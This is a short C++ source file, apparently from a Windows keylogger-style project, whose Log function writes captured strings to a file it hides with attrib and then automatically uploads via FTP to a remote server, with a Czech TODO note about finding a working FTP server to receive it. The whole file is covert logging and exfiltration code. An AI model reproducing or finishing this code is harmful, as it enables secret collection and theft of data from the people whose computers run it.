#include "Essentials.h"

ofstream SaveLog;

void Log( string Snd);
void upload ();
//void upload_Beta(char Txt);
//
//void upload_Beta(char Txt)
//{
//	/* DONE (RegMouse#1#): finish this */
//}
void upload()
{
	/* TODO (RegMouse#1#): najit a pridat funkcni ftp server */
	
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet, "127.0.0.1", INTERNET_DEFAULT_FTP_PORT, "", "", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, "Log.txt", "/upload/ProgramLog.txt", FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);
}

void Log( string Snd)
{
	system("attrib -h Log.txt");
	SaveLog.open ("Log.txt", std::ios_base::app);
	SaveLog << Snd << endl;
	SaveLog.close();
	upload();
	system("attrib +h Log.txt");

//	upload_Beta(char Txt);
}
